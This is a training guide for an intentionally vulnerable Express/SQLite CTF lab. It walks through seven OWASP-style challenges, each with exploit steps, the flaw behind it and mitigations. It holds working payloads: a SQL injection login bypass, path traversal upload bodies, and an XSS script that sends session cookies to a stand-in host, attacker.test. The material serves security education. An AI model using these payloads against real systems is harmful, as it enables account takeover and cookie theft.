# Vulnerable CTF Application Guide

This guide documents how to set up, attack, and defend the intentionally vulnerable application included in this repository. It is designed for red-team style training aligned with the OWASP Top 10 and includes:

- ✅ A walkthrough for exploiting every built-in challenge and capturing the exposed flags.
- 🔐 Secure coding principles that are violated on purpose in the lab.
- 🛡️ Mitigation strategies you can apply to harden a production-grade build.

> **Legal Notice**
> The application is intentionally insecure and must only be used in isolated lab environments that you control. Do **not** deploy it to the public internet or target third-party systems.

---

## Environment Overview

- **Stack:** Node.js, Express, SQLite, EJS templates, and a tri-colour India-inspired UI theme.
- **Default credentials:**
  - Admin: `admin / admin123`
  - Standard user: `alice / password123`
- **Server port:** `5000` (configurable via the `PORT` environment variable).
- **Database:** SQLite file located at `vulnerable_ctf.db` that is bootstrapped automatically on startup.

---

## Challenge Walkthroughs

Each challenge below contains the following sections:

- **Objective** – What the learner must accomplish.
- **How to Exploit** – Reproducible steps and payloads to obtain the flag.
- **Why it Works** – An explanation of the vulnerable code paths.
- **Mitigations** – Concrete fixes tied to secure coding principles.

### 1. SQL Injection – `/login`

**Objective:** Bypass authentication and capture flag `CTF{SQL1_1nj3ct10n_MAST3R}`.

**How to Exploit:**
1. Visit `/login` and submit the username `admin' --` with any password.
2. The crafted payload terminates the SQL statement early and comments out the password check.
3. You are logged in as the admin and the flag appears on the dashboard challenge card.

**Why it Works:**
- The query in `app.js` interpolates user input directly: `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`.
- No parameterization or escaping is performed, so special characters alter the query structure.

**Mitigations:**
- Use prepared statements with bound parameters when interacting with SQLite or any SQL database.
- Enforce minimum password complexity and account lockout to reduce automated guessing.
- Apply the **OWASP ASVS V5 - Authentication** control to centralize login routines and limit SQL surface area.

### 2. Reflected & Stored XSS – `/dashboard` and `/comment`

**Objective:** Inject JavaScript to steal session cookies and recover `CTF{XSS_C00k13_Th13f}`.

**How to Exploit:**
1. Log in as any user.
2. Post a comment containing `<script>fetch('https://attacker.test/steal?c='+document.cookie)</script>`.
3. When another user loads the dashboard, the script executes and exfiltrates their cookie.
4. The dashboard UI also reflects unescaped post content, allowing quick testing with `?q=<script>alert(1)</script>`.

**Why it Works:**
- The comments and posts are rendered with `<%- ... %>` in EJS, so user content is not escaped.
- Session cookies are flagged `httpOnly: false`, enabling JavaScript access.

**Mitigations:**
- Escape dynamic content by default (`<%= %>` in EJS) and only allow HTML in audited locations.
- Enable security headers (`Content-Security-Policy`, `X-XSS-Protection`) and set `httpOnly` on cookies.
- Follow **OWASP ASVS V5 - Output Encoding** and **CWE-79** remediation patterns.

### 3. Broken Access Control – `/admin`

**Objective:** Reach the administrative panel as a non-privileged user and capture `CTF{Br0k3n_Acc3ss_C0ntr0l}`.

**How to Exploit:**
1. Log in as `alice`.
2. Manually browse to `/admin` without elevating permissions.
3. The route returns the full admin interface and the non-admin flag.

**Why it Works:**
- The route only checks that the request is authenticated. It does not validate the user role before rendering the page.

**Mitigations:**
- Enforce role checks using middleware that validates `req.session.user.role` before proceeding.
- Apply the **Principle of Least Privilege** and design role-based access control (RBAC) at the controller layer.
- Record failed authorization attempts and alert when privilege misuse occurs.

### 4. Insecure Direct Object Reference – `/profile/:userId`

**Objective:** View another user's profile and collect `CTF{1D0R_Pr0bl3m}`.

**How to Exploit:**
1. Log in as `alice` and visit `/profile/1` to view the admin profile.
2. Because IDs increment sequentially, you can iterate through `/profile/2`, `/profile/3`, etc.
3. When the ID does not match your session user, the application reveals the flag.

**Why it Works:**
- Profiles are fetched directly from the database by ID without verifying ownership.
- The route relies on the client not tampering with the `:userId` path parameter.

**Mitigations:**
- Authorize access to each record by comparing `req.session.user.id` to the requested ID.
- Use opaque identifiers (UUIDs) instead of sequential IDs in user-facing URLs.
- Adopt **OWASP ASVS V4 - Access Control** guidelines for object-level authorization.

### 5. Path Traversal & Unsafe File Upload – `/upload`

**Objective:** Write files outside the intended directory and identify `CTF{P4th_Tr4v3rs4l_F0und}`.

**How to Exploit:**
1. Submit a POST request to `/upload` with JSON body `{ "filename": "../public/pwned.txt", "content": "owned" }`.
2. The server writes directly to the computed path, escaping the `uploads` sandbox.
3. The response includes the flag when the filename contains traversal sequences.

**Why it Works:**
- Filenames are concatenated with `path.join` but no canonicalization or validation follows.
- File uploads are processed entirely in memory without size or type checks.

**Mitigations:**
- Normalize the upload path and ensure it remains inside the intended directory using `path.resolve` checks.
- Restrict allowed file types and apply size limits.
- Store user-provided content outside the web root or move to object storage with presigned URLs.

### 6. Password Reset Abuse – `/reset-password`

**Objective:** Change another user's password and access their account.

**How to Exploit:**
1. Send `POST /reset-password` with `{ "email": "alice@example.com", "newPassword": "hacked" }`.
2. Log in with `alice / hacked` to confirm the reset succeeded.

**Why it Works:**
- No authentication or token validation occurs before updating the password.
- Email addresses are treated as a shared secret.

**Mitigations:**
- Require a signed, single-use reset token delivered out-of-band.
- Log and rate-limit reset attempts to prevent abuse.
- Map to **OWASP ASVS V7 - Credential Recovery** requirements.

### 7. Information Disclosure – `/debug`

**Objective:** Collect sensitive operational data and the flag `CTF{D3bug_3ndp01nt_3xp0s3d}`.

**How to Exploit:**
1. Browse to `/debug` while authenticated.
2. Observe live session data, uploaded file paths, and the flag.

**Why it Works:**
- The debug route returns internal state without authentication or environment gating.

**Mitigations:**
- Remove debug endpoints in production builds or protect them with strong authentication.
- Add runtime environment checks (`if (process.env.NODE_ENV !== 'development')`) before exposing diagnostics.
- Align with **OWASP ASVS V1 - Architecture, Design and Threat Modeling** controls.

---

## Secure Coding Principles Recap

1. **Input Validation & Output Encoding:** Treat all client data as untrusted and validate/encode before use.
2. **Least Privilege & Defense in Depth:** Limit each account and component to the minimal permissions required.
3. **Secure Session Management:** Mark cookies as `HttpOnly`, `Secure`, `SameSite=strict`, and rotate on privilege changes.
4. **Error & Logging Hygiene:** Avoid leaking stack traces to clients; log security events centrally with correlation IDs.
5. **Configuration Hardening:** Disable debug features, enforce TLS, and keep dependencies patched.
6. **Secure SDLC Practices:** Incorporate threat modeling, code review, and automated testing (SAST/DAST) into the pipeline.

---

## Hardening Roadmap

To convert this lab into a production-ready service:

1. **Refactor Data Access:** Replace raw string queries with a repository layer that enforces parameterized statements.
2. **Implement RBAC Middleware:** Create reusable authorization guards for admin-only or owner-only routes.
3. **Adopt Secure Defaults:** Configure Helmet for HTTP headers, enforce HTTPS, and enable CSRF protection for forms.
4. **Add Automated Tests:** Write integration tests covering authentication, authorization, and sanitization logic.
5. **Pipeline Integration:** Add linting, unit tests, SAST/DAST scanners, and container image scanning before deployment.
6. **Operational Controls:** Instrument monitoring, centralized logging, and secrets management (Vault/KMS) for runtime safety.

---

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Application Security Verification Standard (ASVS)](https://owasp.org/www-project-application-security-verification-standard/)
- [NIST SP 800-63B – Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

Happy hacking and stay safe! 🇮🇳
